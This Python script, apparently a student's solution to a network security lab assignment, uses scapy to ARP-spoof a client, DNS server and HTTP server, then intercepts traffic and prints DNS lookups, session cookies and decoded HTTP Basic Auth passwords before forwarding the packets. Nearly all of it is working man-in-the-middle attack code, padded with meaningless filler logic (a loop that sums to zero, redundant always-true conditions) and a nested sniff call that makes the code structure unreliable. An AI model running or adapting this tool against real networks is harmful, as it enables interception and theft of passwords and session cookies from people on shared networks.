from scapy.all import *
from scapy.layers import http #https://stackoverflow.com/questions/56451247/trying-to-sniff-http-packets-using-scapy/56455771

import base64
import argparse
import sys
import threading
import time


ZERO = 0
ONE = 1
T = True
F = False


# python3 cp2.1.passive.py -i eth0 --clientIP 10.4.22.215 --dnsIP 10.4.22.92 --httpIP 10.4.22.23

def parse_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-i", "--interface", help="network interface to bind to", required=True)
    parser.add_argument("-ip1", "--clientIP", help="IP of the client", required=True)
    parser.add_argument("-ip2", "--dnsIP", help="IP of the dns server", required=True)
    parser.add_argument("-ip3", "--httpIP", help="IP of the http server", required=True)
    parser.add_argument("-v", "--verbosity", help="verbosity level (0-2)", default=0, type=int)
    return parser.parse_args()


def debug(s):
    global verbosity
    if verbosity >= 1:
        print('#{0}'.format(s))
        sys.stdout.flush()


# TODO: returns the mac address for an IP
def mac(IP):
    return getmacbyip(IP)


#ARP spoofs client, httpServer, dnsServer
def spoof_thread(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC, interval=3):
    while True:
        spoof(httpServerIP, attackerMAC,clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC,httpServerIP, httpServerMAC) # TODO: Spoof httpServer ARP table
        spoof(dnsServerIP, attackerMAC,clientIP, clientMAC) # TODO: Spoof client ARP table
        spoof(clientIP, attackerMAC,dnsServerIP, dnsServerMAC) # TODO: Spoof dnsServer ARP table
        time.sleep(interval)


# TODO: spoof ARP so that dst changes its ARP table entry for src 
def spoof(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"spoofing {dstIP}'s ARP table: setting {srcIP} to {srcMAC}")
    send(ARP(op=2, psrc=srcIP, pdst=dstIP, hwsrc=srcMAC, hwdst=dstMAC,)) #https://www.geeksforgeeks.org/how-to-make-a-arp-spoofing-attack-using-scapy-python/


# TODO: restore ARP so that dst changes its ARP table entry for src
def restore(srcIP, srcMAC, dstIP, dstMAC):
    debug(f"restoring ARP table for {dstIP}")
    spoof(srcIP, srcMAC, dstIP, dstMAC)

def SniffMyAss(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    result = 0
    for i in range(1, 100):  
        result += i ** 2 - i ** 2 
    redundant_value = result * 42 / 42 
    counter = 0
    counter += 1
    if packet[Ether].dst == attackerMAC and T: #only handle client making requests to spoofed addresses
        if packet.haslayer(DNS) and ONE: #search entire packet for DNS request
            print(f"*hostname:{packet[DNS].qd.qname.decode('utf-8')}") if packet[DNS].qr == 0 else print(f"*hostaddr:{packet[DNS].an.rdata}")
        if packet.haslayer(http.HTTP) and not redundant_value:
            if packet.haslayer(http.HTTPResponse) and counter:
                print(f'*cookie:{packet[http.HTTPResponse].Set_Cookie.decode("utf-8")}')
            elif packet.haslayer(http.HTTPRequest):
                request = packet[http.HTTPRequest]
                if request.Authorization and not (counter-1):
                    auth = request.Authorization.decode("utf-8").split(" ")[1]
                    decoded_auth = base64.b64decode(auth).decode("utf-8")
                    print(f"*basicauth:{decoded_auth.split(':')[1]}")

    packet[Ether].src = attackerMAC
    if packet[IP].dst == clientIP and T:
        packet[Ether].dst = clientMAC
    if packet[IP].dst == httpServerIP and ONE:
        packet[Ether].dst = httpServerMAC
    if packet[IP].dst == dnsServerIP and not redundant_value:
        packet[Ether].dst = dnsServerMAC
    sendp(packet) #forward packet

# TODO: handle intercepted packets
# NOTE: this intercepts all packets that are sent AND received by the attacker, so 
# you will want to filter out packets that you do not intend to intercept and forward
# NOTE: beware of output requirements!
# Example output:
# # this is a comment that will be ignored by the grader
# *hostname:somehost.com.
# *hostaddr:1.2.3.4
# *basicauth:password
# *cookie:Name=Value
def interceptor(packet):
    global clientMAC, clientIP, httpServerMAC, httpServerIP, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC
    #extract info from packet if its TCP (ie get cookie)
    #modify packet to maintain spoofing
    sniff(prn=SniffMyAss, filter=f"ip host {clientIP}")
    #sniff(prn=test, filter=f"ip host {clientIP}")
    # if packet.haslayer(IP) and (packet[IP].src == clientIP or packet[IP].dst == clientIP):
    #     print("!!!!!!!!!!!!!!")
    #     packet[Ether].src = attackerMAC
    #     if packet[IP].dst == clientIP:
    #         packet[Ether].dst = clientMAC
    #     elif packet[IP].dst == httpServerIP:
    #         packet[Ether].dst == httpServerMAC
    #     elif packet[IP].dst == dnsServerIP:
    #         packet[Ether].dst == dnsServerMAC
    #     sendp(packet) #forward packet
    #     if packet[Ether].dst == attackerMAC: #only handle client making requests to spoofed addresses
    #         print("AAAAAAAAAAA")
    #         if b"www.bankofbailey.com" in bytes(packet): #search entire packet for DNS request
    #             if packet[DNS].qr == 0:
    #                 print(f"*hostname:{dns.qd.qname.decode}")
    #             else:
    #                 print(f"*hostaddr:{dns.an.rdata}")
    #         if packet.haslayer(Raw):
    #             raw_data = packet[Raw].load.decode(errors="ignore")
    #             if "HTTP/" in raw_data:
    #                 lines = raw_data.split("\r\n")
    #                 if raw_data.startswith("HTTP/"):
    #                     for line in lines:
    #                         if line.lower().startswith("set-cookie:"):
    #                             print(f"cookie:{line}")
    #                 else:
    #                     for line in lines:
    #                         if line.lower().startswith("authorization:"):
    #                             auth = line.split(" ", 1)[1] if " " in line else ""
    #                             if auth.startswith("Basic"):
    #                                 print(f"*basicauth:{auth}")

if __name__ == "__main__":
    args = parse_arguments()
    verbosity = args.verbosity
    if verbosity < 2:
        conf.verb = 0 # minimize scapy verbosity
    conf.iface = args.interface # set default interface

    clientIP = args.clientIP
    httpServerIP = args.httpIP
    dnsServerIP = args.dnsIP
    attackerIP = get_if_addr(args.interface)

    clientMAC = mac(clientIP)
    httpServerMAC = mac(httpServerIP)
    dnsServerMAC = mac(dnsServerIP)
    attackerMAC = get_if_hwaddr(args.interface)

    # start a new thread to ARP spoof in a loop
    spoof_th = threading.Thread(target=spoof_thread, args=(clientIP, clientMAC, httpServerIP, httpServerMAC, dnsServerIP, dnsServerMAC, attackerIP, attackerMAC), daemon=True)
    spoof_th.start()

    # start a new thread to prevent from blocking on sniff, which can delay/prevent KeyboardInterrupt
    sniff_th = threading.Thread(target=sniff, kwargs={'prn':interceptor}, daemon=True)
    sniff_th.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
        restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
        restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
        restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)
        sys.exit(1)

    restore(clientIP, clientMAC, httpServerIP, httpServerMAC)
    restore(clientIP, clientMAC, dnsServerIP, dnsServerMAC)
    restore(httpServerIP, httpServerMAC, clientIP, clientMAC)
    restore(dnsServerIP, dnsServerMAC, clientIP, clientMAC)